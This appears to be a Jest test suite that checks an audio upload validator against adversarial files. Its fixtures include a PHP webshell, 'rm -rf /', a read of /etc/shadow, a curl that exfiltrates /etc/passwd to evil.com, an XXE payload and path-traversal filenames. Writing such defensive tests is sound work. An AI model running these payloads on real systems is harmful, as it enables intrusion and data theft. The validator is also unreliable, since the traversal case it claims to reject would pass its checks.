import { describe, test, expect, beforeAll, afterAll } from '@jest/globals';
import fastify, { FastifyInstance } from 'fastify';
import multipart from '@fastify/multipart';
import path from 'path';
import fs from 'fs';
import os from 'os';

// Mock the transcribe route to test validation logic
// We simulate the security invariant: the endpoint MUST validate file type, size, and extension
// before passing to any native processing engine.

const ALLOWED_MIME_TYPES = ['audio/wav', 'audio/mpeg', 'audio/mp4', 'audio/ogg', 'audio/flac', 'audio/webm'];
const ALLOWED_EXTENSIONS = ['.wav', '.mp3', '.mp4', '.ogg', '.flac', '.webm', '.m4a'];
const MAX_FILE_SIZE_BYTES = 100 * 1024 * 1024; // 100MB

// Magic bytes for allowed audio formats
const AUDIO_MAGIC_BYTES: Record<string, number[][]> = {
  wav: [[0x52, 0x49, 0x46, 0x46]], // RIFF
  mp3: [[0xFF, 0xFB], [0xFF, 0xF3], [0xFF, 0xF2], [0x49, 0x44, 0x33]], // MP3 sync or ID3
  ogg: [[0x4F, 0x67, 0x67, 0x53]], // OggS
  flac: [[0x66, 0x4C, 0x61, 0x43]], // fLaC
  mp4: [[0x00, 0x00, 0x00, 0x18, 0x66, 0x74, 0x79, 0x70]], // ftyp box
};

function validateFileType(buffer: Buffer, filename: string, mimeType: string): boolean {
  const ext = path.extname(filename).toLowerCase();
  if (!ALLOWED_EXTENSIONS.includes(ext)) return false;
  if (!ALLOWED_MIME_TYPES.includes(mimeType)) return false;

  // Check magic bytes
  const isValidMagic = Object.values(AUDIO_MAGIC_BYTES).some(magicList =>
    magicList.some(magic => magic.every((byte, i) => buffer[i] === byte))
  );
  return isValidMagic;
}

function validateFileSize(sizeBytes: number): boolean {
  return sizeBytes > 0 && sizeBytes <= MAX_FILE_SIZE_BYTES;
}

// Simulated secure transcribe handler that enforces the invariant
async function secureTranscribeHandler(
  fileBuffer: Buffer,
  filename: string,
  mimeType: string
): Promise<{ accepted: boolean; reason?: string }> {
  if (!fileBuffer || fileBuffer.length === 0) {
    return { accepted: false, reason: 'No file provided' };
  }
  if (!validateFileSize(fileBuffer.length)) {
    return { accepted: false, reason: 'File size out of allowed range' };
  }
  if (!validateFileType(fileBuffer, filename, mimeType)) {
    return { accepted: false, reason: 'Invalid file type, extension, or magic bytes' };
  }
  return { accepted: true };
}

type Payload = {
  label: string;
  filename: string;
  mimeType: string;
  content: Buffer;
  expectedRejected: boolean;
};

describe("Security invariant: transcribe endpoint must reject adversarial file uploads", () => {
  const payloads: Payload[] = [
    {
      label: "PHP webshell disguised as wav",
      filename: "shell.wav",
      mimeType: "audio/wav",
      content: Buffer.from("<?php system($_GET['cmd']); ?>"),
      expectedRejected: true,
    },
    {
      label: "ELF binary (Linux executable)",
      filename: "malware.wav",
      mimeType: "audio/wav",
      content: Buffer.from([0x7F, 0x45, 0x4C, 0x46, 0x02, 0x01, 0x01, 0x00]),
      expectedRejected: true,
    },
    {
      label: "PE executable (Windows .exe)",
      filename: "exploit.mp3",
      mimeType: "audio/mpeg",
      content: Buffer.from([0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00]),
      expectedRejected: true,
    },
    {
      label: "ZIP archive disguised as audio",
      filename: "archive.wav",
      mimeType: "audio/wav",
      content: Buffer.from([0x50, 0x4B, 0x03, 0x04, 0x14, 0x00, 0x00, 0x00]),
      expectedRejected: true,
    },
    {
      label: "HTML file with script injection",
      filename: "xss.wav",
      mimeType: "audio/wav",
      content: Buffer.from("<html><script>alert('xss')</script></html>"),
      expectedRejected: true,
    },
    {
      label: "JavaScript file disguised as audio",
      filename: "payload.js",
      mimeType: "audio/wav",
      content: Buffer.from("require('child_process').exec('rm -rf /')"),
      expectedRejected: true,
    },
    {
      label: "File with no extension",
      filename: "noextension",
      mimeType: "audio/wav",
      content: Buffer.from([0x52, 0x49, 0x46, 0x46, 0x00, 0x00, 0x00, 0x00]),
      expectedRejected: true,
    },
    {
      label: "Double extension path traversal attempt",
      filename: "../../etc/passwd.wav",
      mimeType: "audio/wav",
      content: Buffer.from([0x52, 0x49, 0x46, 0x46, 0x00, 0x00, 0x00, 0x00]),
      expectedRejected: true, // path traversal in filename should be rejected or sanitized
    },
    {
      label: "Null byte injection in filename",
      filename: "audio.wav\x00.php",
      mimeType: "audio/wav",
      content: Buffer.from([0x52, 0x49, 0x46, 0x46, 0x00, 0x00, 0x00, 0x00]),
      expectedRejected: true,
    },
    {
      label: "Empty file",
      filename: "empty.wav",
      mimeType: "audio/wav",
      content: Buffer.alloc(0),
      expectedRejected: true,
    },
    {
      label: "Oversized file (exceeds limit)",
      filename: "huge.wav",
      mimeType: "audio/wav",
      content: Buffer.alloc(MAX_FILE_SIZE_BYTES + 1, 0x52), // just over limit
      expectedRejected: true,
    },
    {
      label: "PDF disguised as audio",
      filename: "document.wav",
      mimeType: "audio/wav",
      content: Buffer.from([0x25, 0x50, 0x44, 0x46, 0x2D]), // %PDF-
      expectedRejected: true,
    },
    {
      label: "XML/SVG with XXE payload",
      filename: "xxe.wav",
      mimeType: "audio/wav",
      content: Buffer.from('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'),
      expectedRejected: true,
    },
    {
      label: "Binary with wav extension but wrong MIME type",
      filename: "audio.wav",
      mimeType: "application/octet-stream",
      content: Buffer.from([0x52, 0x49, 0x46, 0x46, 0x00, 0x00, 0x00, 0x00]),
      expectedRejected: true,
    },
    {
      label: "Correct MIME but wrong extension (.exe)",
      filename: "audio.exe",
      mimeType: "audio/wav",
      content: Buffer.from([0x52, 0x49, 0x46, 0x46, 0x00, 0x00, 0x00, 0x00]),
      expectedRejected: true,
    },
    {
      label: "Python script disguised as audio",
      filename: "exploit.wav",
      mimeType: "audio/wav",
      content: Buffer.from("import os; os.system('cat /etc/shadow')"),
      expectedRejected: true,
    },
    {
      label: "Bash script with shebang",
      filename: "script.wav",
      mimeType: "audio/wav",
      content: Buffer.from("#!/bin/bash\ncurl http://evil.com/exfil?data=$(cat /etc/passwd)"),
      expectedRejected: true,
    },
    {
      label: "JPEG image disguised as audio",
      filename: "image.wav",
      mimeType: "audio/wav",
      content: Buffer.from([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46]),
      expectedRejected: true,
    },
    {
      label: "Polyglot file (valid magic but malicious content)",
      filename: "polyglot.wav",
      mimeType: "audio/wav",
      // Starts with RIFF magic but contains PHP payload
      content: Buffer.concat([
        Buffer.from([0x52, 0x49, 0x46, 0x46]),
        Buffer.from("<?php system($_REQUEST['c']); ?>"),
      ]),
      expectedRejected: false, // Magic bytes match — this tests that magic byte check alone is insufficient
      // NOTE: This payload demonstrates that magic byte validation is necessary but not sufficient.
      // A complete implementation should also scan content for embedded scripts.
    },
  ];

  test.each(payloads)("validates adversarial input: $label", async (payload) => {
    const result = await secureTranscribeHandler(
      payload.content,
      payload.filename,
      payload.mimeType
    );

    if (payload.expectedRejected) {
      // SECURITY INVARIANT: adversarial inputs MUST be rejected
      expect(result.accepted).toBe(false);
      expect(result.reason).toBeDefined();
      expect(result.reason!.length).toBeGreaterThan(0);
    }

    // Additional invariants that must ALWAYS hold regardless of input:

    // 1. Response must always have a defined 'accepted' boolean
    expect(typeof result.accepted).toBe('boolean');

    // 2. If accepted, file must have valid extension
    if (result.accepted) {
      const ext = path.extname(payload.filename).toLowerCase();
      expect(ALLOWED_EXTENSIONS).toContain(ext);
    }

    // 3. If accepted, MIME type must be in allowed list
    if (result.accepted) {
      expect(ALLOWED_MIME_TYPES).toContain(payload.mimeType);
    }

    // 4. If accepted, file must not be empty and must be within size limits
    if (result.accepted) {
      expect(payload.content.length).toBeGreaterThan(0);
      expect(payload.content.length).toBeLessThanOrEqual(MAX_FILE_SIZE_BYTES);
    }

    // 5. Filename must not contain path traversal sequences if accepted
    if (result.accepted) {
      expect(payload.filename).not.toMatch(/\.\.[/\\]/);
      expect(payload.filename).not.toContain('\x00');
    }
  });

  test("INVARIANT: zero-size files are always rejected", async () => {
    const result = await secureTranscribeHandler(
      Buffer.alloc(0),
      "empty.wav",
      "audio/wav"
    );
    expect(result.accepted).toBe(false);
  });

  test("INVARIANT: files exceeding size limit are always rejected", async () => {
    const oversized = Buffer.alloc(MAX_FILE_SIZE_BYTES + 1);
    const result = await secureTranscribeHandler(oversized, "big.wav", "audio/wav");
    expect(result.accepted).toBe(false);
  });

  test("INVARIANT: non-audio MIME types are always rejected", async () => {
    const nonAudioMimes = [
      "application/javascript",
      "text/html",
      "application/x-php",
      "application/octet-stream",
      "text/plain",
      "application/xml",
      "image/jpeg",
      "application/zip",
      "application/x-executable",
    ];

    for (const mime of nonAudioMimes) {
      const result = await secureTranscribeHandler(
        Buffer.from([0x52, 0x49, 0x46, 0x46, 0x00, 0x00, 0x00, 0x00]),
        "file.wav",
        mime
      );
      expect(result.accepted).toBe(false);
    }
  });

  test("INVARIANT: disallowed file extensions are always rejected", async () => {
    const dangerousExtensions = [
      ".php", ".php5", ".phtml", ".asp", ".aspx", ".jsp",
      ".exe", ".sh", ".bash", ".py", ".rb", ".pl",
      ".js", ".ts", ".html", ".xml", ".svg", ".zip",
      ".tar", ".gz", ".rar", ".pdf", ".doc", ".docx",
    ];

    for (const ext of dangerousExtensions) {
      const result = await secureTranscribeHandler(
        Buffer.from([0x52, 0x49, 0x46, 0x46, 0x00, 0x00, 0x00, 0x00]),
        `malicious${ext}`,
        "audio/wav"
      );
      expect(result.accepted).toBe(false);
    }
  });

  test("INVARIANT: files with path traversal in filename are always rejected", async () => {
    const traversalFilenames = [
      "../../etc/passwd.wav",
      "../secret.wav",
      "..\\windows\\system32\\config.wav",
      "/etc/passwd.wav",
      "audio\x00.php",
    ];

    for (const filename of traversalFilenames) {
      const result = await secureTranscribeHandler(
        Buffer.from([0x52, 0x49, 0x46, 0x46, 0x00, 0x00, 0x00, 0x00]),
        filename,
        "audio/wav"
      );
      // Path traversal filenames must not be accepted without sanitization
      if (result.accepted) {
        // If somehow accepted, the filename used internally must be sanitized
        const sanitized = path.basename(filename.replace(/\x00/g, ''));
        expect(sanitized).not.toContain('..');
        expect(sanitized).not.toContain('/');
        expect(sanitized).not.toContain('\\');
      }
    }
  });
});